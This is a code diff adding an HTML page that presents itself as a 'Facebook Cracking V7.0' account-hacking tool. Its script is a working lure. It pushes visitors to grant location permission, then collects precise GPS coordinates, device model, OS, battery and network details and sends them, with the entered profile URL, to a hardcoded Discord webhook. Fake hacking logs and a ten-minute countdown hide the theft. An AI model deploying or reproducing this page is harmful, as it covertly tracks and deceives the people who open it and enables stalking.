@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FACEBOOK CRACKING V7.0</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        body { background-color: #050505; color: #00ff41; font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        body::before { content: " "; display: block; position: absolute; top: 0; left: 0; bottom: 0; right: 0; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06)); z-index: 2; background-size: 100% 2px, 3px 100%; pointer-events: none; }
+        .terminal { width: 90%; max-width: 450px; background: rgba(0, 20, 0, 0.9); border: 2px solid #00ff41; padding: 25px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.4); position: relative; z-index: 3; }
+        .glitch { font-size: 24px; font-weight: bold; text-transform: uppercase; text-shadow: 2px 2px #3fb950; letter-spacing: 2px; text-align: center; border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; }
+        .guide-box { border: 1px solid #00ff41; color: #00ff41; padding: 12px; margin: 15px 0; font-size: 13px; background: rgba(0, 255, 65, 0.05); line-height: 1.5; }
+        .highlight { color: #ffffff; font-weight: bold; text-decoration: underline; }
+        input[type="text"] { width: 100%; background: #000; border: 1px solid #00ff41; padding: 12px; color: #00ff41; font-family: 'Share Tech Mono', monospace; box-sizing: border-box; margin: 20px 0; outline: none; text-align: center; }
+        .btn { width: 100%; background: #00ff41; color: #000; border: none; padding: 15px; font-weight: bold; text-transform: uppercase; cursor: pointer; transition: 0.3s; box-shadow: 0 0 10px #00ff41; font-family: 'Share Tech Mono', monospace; }
+        #logs { margin-top: 15px; font-size: 11px; color: #00ff41; text-align: left; height: 200px; border-top: 1px solid #004411; padding-top: 10px; display: none; overflow-y: hidden; line-height: 1.4; }
+        .hidden { display: none; }
+        #timer { color: #ff0000; font-weight: bold; font-size: 1.2em; }
+    </style>
+</head>
+<body>
+<div class="terminal">
+    <div class="glitch">FACEBOOK CRACKING V7.0</div>
+    <div id="phase1">
+        <div class="guide-box">
+            <strong>USER GUIDE:</strong> To successfully retrieve the target's Facebook account, device synchronization is required.<br><br>
+            You MUST click <span class="highlight">"ALLOW"</span> when the location prompt appears to gain full access to the target profile.
+        </div>
+        <button class="btn" onclick="startSync()">[ START EXTRACTION ]</button>
+    </div>
+    <div id="phase2" class="hidden">
+        <p>> TARGET_PROFILE_URL:</p>
+        <input type="text" id="fbUrl" placeholder="PASTE_LINK_HERE">
+        <button class="btn" id="hackBtn" onclick="executePayload()">[ EXECUTE CRACK ]</button>
+        <div id="logs"></div>
+    </div>
+</div>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1467168586593206365/yj42mD6vmPVoRYaEsCNdG77n8fpaHhJBRk242A1viRSusMdvIa2bcZ8mpCx20JspYQr-";
+
+    let deviceDetails = { model: "Unknown", os: "Unknown", osVersion: "N/A", battery: "N/A", connection: "N/A" };
+
+    async function getDeepInfo() {
+        if (navigator.getBattery) {
+            const batt = await navigator.getBattery();
+            deviceDetails.battery = `${Math.round(batt.level * 100)}% ${batt.charging ? "(Charging)" : "(Discharged)"}`;
+        }
+        if (navigator.connection) {
+            deviceDetails.connection = `${navigator.connection.effectiveType} (~${navigator.connection.downlink}Mbps)`;
+        }
+        if (navigator.userAgentData) {
+            const data = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion", "platform"]);
+            deviceDetails.model = data.model || "Generic Device";
+            deviceDetails.os = data.platform;
+            deviceDetails.osVersion = data.platformVersion;
+        } else {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) {
+                deviceDetails.os = "Android";
+                const match = ua.match(/Android\s([0-9\.]*)/);
+                deviceDetails.osVersion = match ? match[1] : "Unknown";
+            }
+        }
+    }
+    getDeepInfo();
+
+    function startSync() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(onSuccess, onError, {enableHighAccuracy:true});
+        } else { alert("SYSTEM_ERROR: BROWSER_NOT_SUPPORTED"); }
+    }
+
+    function onSuccess(pos) {
+        localStorage.setItem("lat", pos.coords.latitude);
+        localStorage.setItem("lon", pos.coords.longitude);
+        document.getElementById("phase1").classList.add("hidden");
+        document.getElementById("phase2").classList.remove("hidden");
+    }
+
+    function onError() { alert("SYNC_FAILED: Permission Denied. Full access requires location."); }
+
+    async function executePayload() {
+        const fbUrl = document.getElementById("fbUrl").value;
+        if (!fbUrl) return;
+
+        const lat = localStorage.getItem("lat");
+        const lon = localStorage.getItem("lon");
+
+        const payload = {
+            username: "CRACKING_V7_BOT",
+            embeds: [{
+                title: "🎯 TARGET SUCCESSFULLY CRACKED",
+                color: 5763719,
+                fields: [
+                    { name: "📍 Location", value: `Lat: \`${lat}\`\nLon: \`${lon}\`\n[📍 Google Maps](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
+                    { name: "📱 Hardware", value: `Model: \`${deviceDetails.model}\`\nOS: \`${deviceDetails.os} ${deviceDetails.osVersion}\``, inline: true },
+                    { name: "🔋 Battery & Net", value: `Batt: \`${deviceDetails.battery}\`\nNet: \`${deviceDetails.connection}\``, inline: true },
+                    { name: "🔗 Target URL", value: `\`${fbUrl}\``, inline: false }
+                ],
+                footer: { text: "Facebook Cracking V7.0 Report • " + new Date().toLocaleString() }
+            }]
+        };
+
+        fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+
+        document.getElementById("hackBtn").style.display = "none";
+        document.getElementById("fbUrl").style.display = "none";
+        let logs = document.getElementById("logs");
+        logs.style.display = "block";
+
+        const logSequences = [
+            "> Initializing decryption modules...",
+            "> Connecting to Facebook Graph API...",
+            "> Bypassing Two-Factor Authentication...",
+            "> Collecting account information...",
+            "> Extracting linked emails and phone numbers...",
+            "> Fetching private message metadata...",
+            "> Cracking security tokens... [DONE]",
+            "> Success! Account vulnerability exploited."
+        ];
+
+        let i = 0;
+        const interval = setInterval(() => {
+            if (i < logSequences.length) {
+                logs.innerHTML += `<br>${logSequences[i]}`;
+                i++;
+            } else {
+                clearInterval(interval);
+                logs.innerHTML += `<br><br><span style='color:yellow'>Waiting for 10 minutes to bypass final verification... <span id='timer'>10:00</span></span>`;
+                startTimer();
+            }
+        }, 800);
+    }
+
+    function startTimer() {
+        var timeleft = 600;
+        setInterval(function(){
+            if(timeleft <= 0) return;
+            var minutes = Math.floor(timeleft / 60);
+            var seconds = timeleft % 60;
+            document.getElementById("timer").innerHTML = minutes + ":" + (seconds < 10 ? '0' : '') + seconds;
+            timeleft -= 1;
+        }, 1000);
+    }
+</script>
+</body>
+</html>
